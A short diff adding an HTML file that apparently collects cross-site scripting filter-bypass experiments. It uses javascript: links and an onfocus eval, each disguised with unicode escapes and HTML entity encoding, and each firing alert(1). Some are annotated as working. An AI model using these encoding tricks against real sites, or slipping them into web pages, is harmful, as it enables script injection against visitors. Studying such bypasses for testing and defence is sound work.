@@ -1,0 +1,12 @@
+<!-- <a href="javascript:\alert(1)">meow</a> -->
+
+<!-- a -> Unicode -->
+<!-- <a href="javascript:\u0061lert(1)">meow</a> -->
+
+<!-- \ -> HTML encode  Work-->
+<a href="javascript:&#x5c;u0061lert(1)">meow</a>
+
+
+<!-- 
+HTML encoding -> eval("\x61lert(1)") -- work!
+<input type="text" value="123" onfocus="&#x65;&#x76;&#x61;&#x6c;&#x28;&#x22;&#x5c;&#x78;&#x36;&#x31;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;&#x29;">  -->
